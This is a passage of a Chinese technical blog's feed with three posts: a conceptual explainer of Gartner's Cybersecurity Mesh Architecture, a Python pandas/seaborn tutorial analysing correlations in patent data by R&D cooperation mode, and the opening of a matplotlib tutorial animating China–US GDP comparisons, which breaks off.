        &lt;p&gt;Python实现爬虫是很容易的，一般来说就是获取目标网站的页面，对目标页面的分析、解析、识别，提取有用的信息，然后该入库的入库，该下载的下载。以前写过一篇文章&lt;a href=&quot;http://xiejava.ishareread.com/posts/eab21fe5/&quot; ta
      
    
    </summary>
    
    
      <category term="技术" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="开发" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="Python" scheme="https://xiejava.gitee.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>网络安全之认识网络安全网格架构（CSMA）</title>
    <link href="https://xiejava.gitee.io/posts/d236743/"/>
    <id>https://xiejava.gitee.io/posts/d236743/</id>
    <published>2023-09-11T08:18:40.000Z</published>
    <updated>2023-09-11T08:33:33.984Z</updated>
    
    <content type="html"><![CDATA[<p>“网络安全网格（CyberSecurity Mesh）”是 Gartner 提出的网络安全技术发展新趋势，近两年连续入选其年度重要战略技术趋势研究报告，成为当前网络安全领域流行的热词，受到网络安全从业者的高度关注。</p><h2 id="一、概念产生的背景"><a href="#一、概念产生的背景" class="headerlink" title="一、概念产生的背景"></a>一、概念产生的背景</h2><p>如今，由于现在平均每个企业在自己的网络上部署了多达45个安全解决方案，使得任何形式的集中管理都几乎无法实现。更糟糕的是，检测和响应网络事件需要在其中的19个工具之间进行协调，导致每次设备升级时都需要不断管理和重新配置。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230911/1-CSAM%E6%A6%82%E5%BF%B5.png" alt="CSMA概念背景"></p><p>仅仅依靠连接不同安全技术的变通方法是不够的，企业需要一个全面覆盖、深度集成和动态协同的“网络安全网格平台”，提供集中管理和可见性，支持在一个庞大的解决方案生态系统中协同运行，自动适应网络中的动态变化。</p><p>因此有了网络安全网格这个概念。</p><p>Gartner 发布的《2021 年重要战略技术趋势》（Top Strategic Technology Trends for 2021）中描述了网络安全网格的概念：“网络安全网格是一种分布式架构方法，能够实现可扩展、灵活和可靠的网络安全控制。现在许多资产存在于传统安全边界之外，网络安全网格本质上允许围绕人或事物的身份定义安全边界。通过集中策略编排和分布策略执行来实现更加模块化、更加快速响应的安全防护。”</p><p>在 Gartner 发布的《2022 年重要战略技术趋势 》（Top Strategic Technology Trends for 2022）中对网络安全网格概念有了进一步的说明：“数字业务资产分布在云和数据中心，基于边界的传统、分散的安全方法使组织容易遭受攻击。网络安全网格架构提供一种基于身份的可组合安全方法，以创建可扩展和可互操作的服务。通用的集成结构可以保护任务组织的任何资产，对于使用这样的一体化安全工具的组织来说，可将单项安全事件的财务影响平均减少 90%。”</p><p>从上述 Gartner 报告的描述中可以看出，网络安全网格是一种安全架构方法或者策略，而不是一种定义明确的架构或标准化的技术方法，更不是某种产品，其目的是找到能够应对不断发展的业务系统以及网络环境演变所带来的安全挑战的新方法，提供比传统物理边界防护更强大、更灵活和可扩展的安全能力。通过连接、集成和协同管理各种网络安全控制系统、服务和数据来提供综合安全保护的框架。它致力于构建一个灵活、弹性和动态的安全环境，以适应日益复杂和多样化的网络安全威胁。</p><h2 id="二、架构与实现"><a href="#二、架构与实现" class="headerlink" title="二、架构与实现"></a>二、架构与实现</h2><p>Gartner 提出了网络安全网格的具体实现框架，即网络安全网格架构（CyberSecurity Mesh Architecture，CSMA）。这是一种分布式安全服务的协作框架，提供安全分析与情报、统一策略管理、整合操控界面和分布式身份结构等 4个安全基础设施使不同的安全工具能够基于该基础设施协同工作并实现统一的配置和管理，提高安全工具的可组合性、可扩展性和互操作性，解决多种安全工具在各个孤立体系中运行时所带来的问题，实现各种安全能力的有机聚合，适应业务发展需要并达到“力量倍增”的效果。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230911/3-CSMA%E6%9E%B6%E6%9E%842.png" alt="CSMA架构图"><br>网络安全网格架构的组成如上图图所示，4 个基础支撑层之间以及与其他安全系统之间的关系如下：</p><ol><li>安全分析与情报层。可与来自第三方的安全工具开展联合协同检测，基于丰富的威胁分析手段，结合威胁情报，利用机器学习等技术形成更加准确一致的威胁分析结果。</li><li>统一策略管理层。主要包括安全策略编排和安全态势管理，将集中的策略转换为各个安全工具的本地配置策略，实现分布式执行，并支持动态策略管理服务。</li><li>整合操控界面层。实现安全数据可视化，提供安全系统复合视图，主要包括统一的控制面板、告警、审查、指导手册和报告等，使安全团队能够更快速、更有效地响应安全事件。</li><li>身份架构层。主要提供目录服务、自适应访问以及去中心化的身份管理、身份验证和授权管理等功能，支撑构建适合用户需求的零信任网络架构。</li></ol><p>网络安全网格是在物理网络之上构建的逻辑层，网络安全架构的应用视图如下图所示，直观展示了在逻辑层中通过对各种安全能力的编排、执行，使得各种安全工具基于 4 个安全基础层实现互操作，提供统一的安全管控和可见性，而不是在孤岛中运行每个安全工具，从而构建一个能在庞大的安全生态中协同运行，且自动适应网络环境演化的安全平台。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230911/4-CSMA%E6%9E%B6%E6%9E%843.png" alt="CSMA应用视图"></p><h2 id="三、主要特点"><a href="#三、主要特点" class="headerlink" title="三、主要特点"></a>三、主要特点</h2><p>网络安全网格主要涉及设计和建设 IT 安全基础设施，采用“水平”分布式方式将各种安全能力集成到网络中，而不是采用传统的“自上而下”、各种安全设备“一应俱全”的集成方式，致力于构建一个能在庞大的安全生态系统中协同运行，且自动适应网络环境演化的全面覆盖、统一管控、动态协同和快速响应的安全平台。</p><ul><li><p>通用集成框架。网络安全网格提供一种通用的集成框架和方法，实现类似“乐高”化思维的灵活、可组合、可扩展的安全架构。通过标准化工具支持可互操作的各种安全服务编排和协同，从而实现广泛分布的不同安全服务的高效集成，建立起合作的安全生态系统来保护处于本地、数据中心和云中的数字资产，并基于数据分析、情报支持和策略管理等能力的聚合形成更加强大的整体安全防御和响应处置能力。</p></li><li><p>分布式网络架构。网络安全网格利用了“网格”的去中心化、对等协作、结构灵活、连接可靠、扩展性强等优势，不再侧重于围绕所有设备或节点构建“单一”边界，而是围绕每个接入点创建更小的、单独的边界 [5-6]。通过建立与接入点同样多的安全边界，保证物理位置广泛分布的用户能随时随地安全接入，符合零信任网络中的“微分段”要求，使得网络犯罪分子和黑客更难利用整个网络。同时，网络中主客体之间在逻辑上都是点对点直连关系，无须关注具体的物理网络部署，能够简化安全配置且能自动适应网络动态变化。</p></li><li><p>集中管理与分散执行。与传统的网关集中访问控制不同，网络安全网格采用了集中的策略编排和权限管理，基于策略分布式的执行，将网络安全控制能力分布到网络的更多地方，使安全措施更接近需要保护的资产，一方面，有利于消除安全管控盲点，缓解传统集中安全控制存在的性能处理瓶颈，适应用户终端和组织业务分散化发展需要；另一方面，有利于实现全局的安全威胁分析，形成更加一致的安全态势，从而实现更加精准的安全管控和更加快速的响应处置。</p></li><li><p>围绕身份定义安全边界。在当前网络协议中，因缺失身份要素带来了很多安全问题，物理 IP 地址与人和终端的关联性越来越弱，导致基于地址、流量、日志的安全检测和威胁分析技术难以实现针对人的威胁研判；基于网络协议字段特征检测的传统边界访问控制技术，同样使得基于身份的授权访问成为天方夜谭。由于网络威胁本质上是人带来的威胁，因此难以实现精准高效的安全威胁处置。网络安全网格延续了零信任网络的思想，用身份定义网络边界，让身份成为威胁研判与安全管控的基础。</p></li></ul><h2 id="四、应用场景"><a href="#四、应用场景" class="headerlink" title="四、应用场景"></a>四、应用场景</h2><p><strong>网络安全网格的应用场景包括：</strong></p><ol><li>云安全：网络安全网格可用于跨多个云环境提供综合的安全管理和保护，确保云服务的安全性和合规性。</li><li>边缘安全：网络安全网格可以应用于边缘计算环境，以提供安全的边缘设备管理、数据保护和边缘网络保护。</li><li>供应链安全：通过网络安全网格，可以实现供应链中各个环节的安全协同，共享安全信息，降低供应链中的安全风险。</li><li>物联网安全：网络安全网格可以为物联网设备和系统提供统一的安全管理和保护，保障物联网环境的安全性和可信度。</li></ol><h2 id="五、价值和优势"><a href="#五、价值和优势" class="headerlink" title="五、价值和优势"></a>五、价值和优势</h2><p><strong>网络安全网格的主要价值包括：</strong></p><ol><li>综合安全保护：网络安全网格可以集成多个安全控制系统和服务，提供全面的安全保护，从网络边界到终端设备，覆盖各个层面和环节的安全需求。</li><li>动态适应能力：网络安全网格具备弹性和动态适应的特性，能够快速识别和响应新的威胁，并自动调整安全策略和控制措施以提供即时和有效的保护。</li><li>协同合作：网络安全网格促进了不同安全系统和服务之间的协同合作和信息共享。通过共享威胁情报和安全事件信息，提高整体的安全防御能力，并加强各方之间的合作与配合。</li><li>可扩展性和灵活性：网络安全网格具备高度的可扩展性，可以根据实际需求快速部署和调整安全控制系统，适用于各种规模和复杂度的网络环境。</li></ol><p><strong>网络安全网格与传统网络安全方法在以下几个方面存在区别：</strong></p><ol><li>集成性：传统网络安全方法通常是独立而孤立的解决方案，每个安全设备或系统都有自己的管理界面和策略。而网络安全网格强调集成不同的安全控制系统和服务，通过连接和协同工作来提供综合的安全保护，实现整体的安全扩展性和一致性。</li><li>动态适应性：传统网络安全方法通常是静态的，在部署后很少变动，而网络安全网格具备弹性和动态适应的特性。它可以根据实际需求自动调整安全策略和控制措施，灵活应对不断变化的威胁环境。</li><li>协同合作：传统网络安全方法主要依赖于各个安全设备或系统的独立工作，缺乏跨系统的协同合作。而网络安全网格通过实现安全控制系统和服务之间的协同和信息共享，提高整体的安全防御能力，并加强各方之间的合作与配合。</li><li>统一视图和管理：传统网络安全方法通常需要使用多个不同的管理界面来管理各个安全设备或系统，使得安全管理变得复杂而繁琐。而网络安全网格提供统一的视图和管理平台，使得管理员可以更便捷地管理和监控整个安全环境，提高管理效率和反应速度。</li><li>灵活性和可扩展性：传统网络安全方法在部署和扩展时通常需要考虑设备间的兼容性和差异性。而网络安全网格具备高度的灵活性和可扩展性，可以根据实际需求灵活部署和调整安全控制系统，适用于各种规模和复杂度的网络环境。</li></ol><p><strong>网络安全网格架构的优势主要体现以下几个方面：</strong></p><ol><li>实现更加可靠的安全防御。网络安全网格摒弃了传统的边界防护思想，不仅是围绕网络数据中心、服务中心构建“边界”，还围绕每个接入点创建更小的、独立的边界，并由集中的控制中心进行统一管理，从而将安全控制扩展到广泛分布的资产，在提高威胁应对能力的同时，增强了安全系统的可扩展性、灵活性和弹性。</li><li>应对复杂环境下的安全需求。通过网络安全策略集中编排但分散执行的方法，在统一的安全策略控制下，提供一种灵活且易于扩展的安全基础架构，可为混合云和多云等复杂环境中的资产保护提供所需的安全能力。</li><li>实现更加高效的威胁处置。通过安全工具集成，加强了安全数据采集和预测分析之间的协作，可以更加快速、准确地获取安全态势，及时发现并应对安全威胁，可大幅度增强对违规和攻击事件的响应处置能力。</li><li>构建更加开放的安全架构。提供了一种可编排的通用集成框架和方法，支持各类安全服务之间的协同工作，用户可自主选择当前和新兴的安全技术与标准，面向云原生和应用程序接口（Application Programming Interface，API） 插 件的环境更加易于集成，便于定制与扩展，能有效弥补不同供应商安全方案之间的能力差距。</li><li>降低建设维护的成本与难度。用户可以有效减少管理一组庞大的孤立安全解决方案的开销，同时，安全能力部署和维护所需的时间更少、成本更低，易于与用户已建设的身份识别与访问管理（Identity and Access Management，IAM）、安全信息和事件管理（Security Information and Event Management，SIEM）、 安 全运营中心（Security Operations Center，SOC）、态势感知等安全系统共存，也方便对接已建设的专线、软件定义广域网（Software-Defined Wide Area Network，SD-WAN）等网络服务。</li></ol><hr><p> 博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p> <center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注微信公众号,一起学习、成长！</center></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;“网络安全网格（CyberSecurity Mesh）”是 Gartner 提出的网络安全技术发展新趋势，近两年连续入选其年度重要战略技术趋势研究报告，成为当前网络安全领域流行的热词，受到网络安全从业者的高度关注。&lt;/p&gt;
&lt;h2 id=&quot;一、概念产生的背景&quot;&gt;&lt;a hre
      
    
    </summary>
    
    
      <category term="技术" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="网络安全" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络安全" scheme="https://xiejava.gitee.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Python进行数据相关性分析实战</title>
    <link href="https://xiejava.gitee.io/posts/cd0f90f9/"/>
    <id>https://xiejava.gitee.io/posts/cd0f90f9/</id>
    <published>2023-08-31T10:10:01.000Z</published>
    <updated>2023-08-31T10:21:21.736Z</updated>
    
    <content type="html"><![CDATA[<p>平时在做数据分析的时候，会要对特征进行相关性分析，分析某些特征之间是否存在相关性。本文将通过一个实例来对数据进行相关性分析与展示。</p><h2 id="一、数据集介绍"><a href="#一、数据集介绍" class="headerlink" title="一、数据集介绍"></a>一、数据集介绍</h2><p>本次分析的是企业合作研发模式效果分析，企业的合作研发大致分为 企企合作、企学合作、企研合作、企学研合作，也就是企业与企业合作研发、企业与大学合作研发、企业与研究所合作研法、企业联合学校、研究所共同合作研发。现在就是想通过数据分析来看看那种合作研发模式的效果最好，产出最佳。</p><p>数据集是从公开网站获取的公开的专利信息，包括专利的公告日期、专利评分、专利估值，这些指标说明了专利的价值。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230831/%E7%A0%94%E5%8F%91%E4%B8%93%E5%88%A9%E6%95%B0%E6%8D%AE%E9%9B%86.png" alt="专利数据集"></p><h2 id="二、数据整理和探索"><a href="#二、数据整理和探索" class="headerlink" title="二、数据整理和探索"></a>二、数据整理和探索</h2><p>有了数据后先对数据进行整理，在这里我们用II表示企企合作、IU表示企学合作、IR表示企研合作、IUR表示企学研合作。<br>先导入python数据分析三大件numpy、pandas、matplotlib</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">plt.rcParams[<span class="string">"font.sans-serif"</span>]=[<span class="string">"SimHei"</span>] <span class="comment">#设置字体</span></span><br><span class="line">plt.rcParams[<span class="string">"axes.unicode_minus"</span>]=<span class="literal">False</span> <span class="comment">#该语句解决图像中的“-”负号的乱码问题</span></span><br></pre></td></tr></table></figure><p>对数据进行整理，将“有效”的数据检索出来，将合作研发的模式标识出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">II_data_original=pd.read_excel(<span class="string">r'./data/绿色低碳专利企企合作申报总数据_21578_2023-03-11.xlsx'</span>) <span class="comment">#企企合作</span></span><br><span class="line">IU_data_original=pd.read_excel(<span class="string">r'./data/绿色低碳专利企学合作申报总数据_6451_2023-03-11.xlsx'</span>)  <span class="comment">#企学合作</span></span><br><span class="line">IR_data_original=pd.read_excel(<span class="string">r'./data/绿色低碳专利企研合作申报总数据_1706_2023-03-11.xlsx'</span>)  <span class="comment">#企研合作</span></span><br><span class="line">IUR_data_original=pd.read_excel(<span class="string">r'./data/绿色低碳专利企学研合作申报总数据_241_2023-03-11.xlsx'</span>)  <span class="comment">#企学研合作</span></span><br><span class="line">II_data_original[<span class="string">'class_type'</span>]=<span class="string">'II'</span></span><br><span class="line">IU_data_original[<span class="string">'class_type'</span>]=<span class="string">'IU'</span></span><br><span class="line">IR_data_original[<span class="string">'class_type'</span>]=<span class="string">'IR'</span></span><br><span class="line">IUR_data_original[<span class="string">'class_type'</span>]=<span class="string">'IUR'</span></span><br><span class="line">data_original=II_data_original.append([IU_data_original,IR_data_original,IUR_data_original])</span><br><span class="line">data_original=data_original[(data_original.法律有效性==<span class="string">'有效'</span>)]</span><br><span class="line">data_original</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230831/%E7%A0%94%E5%8F%91%E5%90%88%E4%BD%9C%E6%A8%A1%E5%BC%8F%E6%A0%87%E7%AD%BE.png" alt="合作研发的模式标识"><br>对日期进行处理，我们以年度为单位来分析每年各企业合作研发模式的数据，所以将日期处理成“年”为单位。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#处理日期</span></span><br><span class="line">data_original[<span class="string">'date'</span>]=pd.to_datetime(data_original[<span class="string">'公开(公告)日'</span>],format=<span class="string">"%Y%m%d"</span>)</span><br><span class="line">data_original[<span class="string">'year'</span>]=data_original[<span class="string">'date'</span>].dt.strftime(<span class="string">'%Y'</span>)</span><br><span class="line">data_original</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230831/%E5%B9%B4%E4%BB%BD%E6%A0%87%E7%AD%BE.png" alt="年份标签"></p><p>我们只需要分析相应的专利质量的指标，这里与专利质量相关的指标大致为引文数量、专利估值、专利评分。然后以年度为单位来看看数据。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">data_group=data_original.groupby([<span class="string">'year'</span>,<span class="string">'class_type'</span>]).size()</span><br><span class="line">df_data_group=data_group.unstack()</span><br><span class="line">data_group_count=data_original.groupby([<span class="string">'year'</span>]).size()</span><br><span class="line">data_group_quotecount=data_original[[<span class="string">'year'</span>,<span class="string">'引文数量总计'</span>]].groupby([<span class="string">'year'</span>]).sum()  <span class="comment">#引文数量</span></span><br><span class="line">data_group_value=data_original[[<span class="string">'year'</span>,<span class="string">'专利估值'</span>]].groupby([<span class="string">'year'</span>]).mean() <span class="comment">#专利估值</span></span><br><span class="line">data_group_grade=data_original[[<span class="string">'year'</span>,<span class="string">'专利评分'</span>]].groupby([<span class="string">'year'</span>]).mean() <span class="comment">#专利评分grade</span></span><br><span class="line">df_data_group[<span class="string">'count'</span>]=data_group_count</span><br><span class="line">df_data_group[<span class="string">'quotecount'</span>]=data_group_quotecount</span><br><span class="line">df_data_group[<span class="string">'value'</span>]=data_group_value</span><br><span class="line">df_data_group[<span class="string">'grade'</span>]=data_group_grade</span><br><span class="line">df_data_group</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230831/%E5%90%88%E4%BD%9C%E7%A0%94%E5%8F%91%E6%95%B0%E6%8D%AE.png" alt="合作研发数据"></p><p>历年（2004-2022年）专利的合作模式的专利数量增长趋势</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df_data_group.plot.bar(y=[<span class="string">'II'</span>,<span class="string">'IR'</span>,<span class="string">'IU'</span>,<span class="string">'IUR'</span>],figsize=(<span class="number">32</span>,<span class="number">4</span>),stacked=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230831/%E5%90%88%E4%BD%9C%E6%A8%A1%E5%BC%8F%E7%9A%84%E4%B8%93%E5%88%A9%E6%95%B0%E9%87%8F%E5%A2%9E%E9%95%BF%E8%B6%8B%E5%8A%BF.png" alt="合作模式的专利数量增长趋势"></p><p>历年（2015-2022年）的合作模式的专利数量对比情况</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df_data_group[<span class="string">'2015'</span>:<span class="string">'2022'</span>].plot.bar(y=[<span class="string">'II'</span>, <span class="string">'IR'</span>, <span class="string">'IU'</span>, <span class="string">'IUR'</span>], figsize=(<span class="number">32</span>, <span class="number">4</span>))</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230831/%E5%90%88%E4%BD%9C%E6%A8%A1%E5%BC%8F%E7%9A%84%E4%B8%93%E5%88%A9%E6%95%B0%E9%87%8F%E5%AF%B9%E6%AF%94%E6%83%85%E5%86%B5.png" alt="合作模式的专利数量对比情况"></p><p>从数据上可以看出，从2004年-2021年前些年，企业的研发模式是比较单一的，2004-2008年大部分都是企企合作的研发模式，其他研发模式先对比较少。从2004年-2021年，随着我国企业对研发的投入力度也来越大，专利的数量是逐年递增的，研发模式也逐步的多样化起来，但还是以企企合作和企学合作为主。</p><h2 id="三、数据相关性分析与展示"><a href="#三、数据相关性分析与展示" class="headerlink" title="三、数据相关性分析与展示"></a>三、数据相关性分析与展示</h2><p>因为从数据上看，从2015年以后各种研发模式逐步的多样化起来，所以我们来看一下2015年以后研发模式与研发质量各项指标的相关性。<br>通过numpyde的corrcoef()方法可以很方便的计算出各个特征之间的相关性系数，得出相关性矩阵。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ruslut=np.corrcoef(df_data_group[<span class="string">'2015'</span>:<span class="string">'2022'</span>],rowvar=<span class="literal">False</span>)</span><br><span class="line">ruslut</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230831/%E7%9B%B8%E5%85%B3%E6%80%A7%E7%9F%A9%E9%98%B5.png" alt="相关性矩阵"></p><p>看数据肯定没有看图形直观，所以我们将这个相关性矩阵进行可视化的展示。这里用seaborn来做数据的图形化展示。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns</span><br><span class="line">figure, ax = plt.subplots(figsize=(<span class="number">12</span>, <span class="number">12</span>))</span><br><span class="line">df=df_data_group[<span class="string">'2015'</span>:<span class="string">'2022'</span>]</span><br><span class="line">sns.heatmap(df.corr(), square=<span class="literal">True</span>, annot=<span class="literal">True</span>, ax=ax)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230831/%E7%9B%B8%E5%85%B3%E6%80%A7%E7%9F%A9%E9%98%B5%E5%9B%BE.png" alt="相关性矩阵图形化展示"></p><p>这里可以看出企企合作和企学合作的数量相关性比较高，而企研合作value和grade具有相关性，说明企研合作模式的研发质量相对来说比较好。</p><p>最后，我们来看一下专利TOP20的单位研发类型分布、估值TOP20的专利的研发类型分布、评分TOP20的专利、研发类型的分布。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">data_countbyComp=data_original[[<span class="string">'第一申请人-原文'</span>,<span class="string">'class_type'</span>]].groupby([<span class="string">'第一申请人-原文'</span>]).size()</span><br><span class="line">df_data_countbyComp=pd.DataFrame(data_countbyComp,columns=[<span class="string">'counts'</span>])</span><br><span class="line">df_data_countbyCompTOP=df_data_countbyComp.sort_values(<span class="string">'counts'</span>,ascending=<span class="literal">False</span>)[<span class="number">0</span>:<span class="number">10</span>]</span><br><span class="line">count_top=data_original[(data_original[<span class="string">'第一申请人-原文'</span>].isin(df_data_countbyCompTOP.index.values))]</span><br><span class="line">value_top=data_original.sort_values(<span class="string">'专利估值'</span>,ascending=<span class="literal">False</span>)[<span class="number">0</span>:<span class="number">10</span>]</span><br><span class="line">grade_top=data_original.sort_values(<span class="string">'专利评分'</span>,ascending=<span class="literal">False</span>)[<span class="number">0</span>:<span class="number">10</span>]</span><br><span class="line">count_top_show=count_top.groupby([<span class="string">'class_type'</span>]).size()</span><br><span class="line">value_top_show=value_top.groupby([<span class="string">'class_type'</span>]).size()</span><br><span class="line">grade_top_show=grade_top.groupby([<span class="string">'class_type'</span>]).size()</span><br><span class="line">grade_top_show.index.values</span><br><span class="line">fig, axs = plt.subplots(<span class="number">1</span>, <span class="number">3</span>,figsize=(<span class="number">18</span>, <span class="number">18</span>))</span><br><span class="line">axs[<span class="number">0</span>].pie(count_top_show,labels=count_top_show.index.values,autopct=<span class="string">'%.2f%%'</span>,explode=(<span class="number">0.05</span>,<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">axs[<span class="number">0</span>].set(title=<span class="string">'数量TOP20的单位,研发类型分布'</span>)</span><br><span class="line">axs[<span class="number">1</span>].pie(value_top_show,labels=value_top_show.index.values,autopct=<span class="string">'%.2f%%'</span>,explode=(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0.05</span>))</span><br><span class="line">axs[<span class="number">1</span>].set(title=<span class="string">'估值TOP20的专利,研发类型分布'</span>)</span><br><span class="line">axs[<span class="number">2</span>].pie(grade_top_show,labels=grade_top_show.index.values,autopct=<span class="string">'%.2f%%'</span>,explode=(<span class="number">0.05</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">axs[<span class="number">2</span>].set(title=<span class="string">'评分TOP20的专利,研发类型分布'</span>)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230831/%E5%88%86%E5%B8%83%E5%9B%BE.png" alt="分布图"></p><p>这里可以看出数量上还是以企企合作研发的模式最多，但是从专利的估值评分来看企学的专利估值占比最高。说明从 企企合作、企学合作、企研合作、企学研合作的这些企业合作研发模式看，企企合作研发数量最多，企学合作研发的质量相对较高。</p><p>至此，本文通过一个实例介绍了用python通过数据分析三件套numpy、pandas、matplotlib进行数据相关性分析的过程。</p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注微信公众号,一起学习、成长！</center></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;平时在做数据分析的时候，会要对特征进行相关性分析，分析某些特征之间是否存在相关性。本文将通过一个实例来对数据进行相关性分析与展示。&lt;/p&gt;
&lt;h2 id=&quot;一、数据集介绍&quot;&gt;&lt;a href=&quot;#一、数据集介绍&quot; class=&quot;headerlink&quot; title=&quot;一、数据集
      
    
    </summary>
    
    
      <category term="技术" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="开发" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="Python" scheme="https://xiejava.gitee.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python通过matplotlib动态绘图实现中美GDP历年对比趋势动图</title>
    <link href="https://xiejava.gitee.io/posts/66779ce6/"/>
    <id>https://xiejava.gitee.io/posts/66779ce6/</id>
    <published>2023-08-27T03:46:35.000Z</published>
    <updated>2023-08-27T04:02:19.660Z</updated>
    
    <content type="html"><![CDATA[<p>随着中国的各种实力的提高，经常在各种媒体上看到中国与各个国家历年的各种指标数据的对比，为了更清楚的展示历年的发展趋势，有的还做成了动图，看到中国各种指标数据的近年的不断逆袭，心中的自豪感油然而生。今天通过Python来实现matplotlib的动态绘图，将中美两国近年的GDP做个对比，展示中国GPD对美国的追赶态势，相信不久的将来中国的GDP数据将稳超美国。</p><p>效果如下：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230827/showgdp-%E8%87%AA%E5%8A%A8.gif" alt="中美GDP历年对比趋势动图"></p><p>实现上面的动态绘图效果，综合用到了pandas的数据采集、数据整理、matplotlib绘图、坐标轴及数据的动态定义、定时器等知识。最终通过Python的GUI库PySide进行展示形成一个GUI的可执行程序。</p><h2 id="一、数据采集和准备"><a href="#一、数据采集和准备" class="headerlink" title="一、数据采集和准备"></a>一、数据采集和准备</h2><p>中美历年的GDP数据通过百度在网上一搜一大把。我是从<a href="https://www.kylc.com/stats/global/yearly_per_country/g_gdp/chn-usa.html" target="_blank" rel="noopener">https://www.kylc.com/stats/global/yearly_per_country/g_gdp/chn-usa.html</a> 找到的数据。将数据整理成EXCEL保存至data\中国VS美国.xlsx。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230827/%E4%B8%AD%E7%BE%8EGDP%E6%95%B0%E6%8D%AE%E9%9B%86.png" alt="中国VS美国GDP数据集"></p><p>有从1966年至2022年的中美GDP的数据。<br>首先对这些数据进行整理，因为获取的GDP数据是字符串类型如17.96万亿 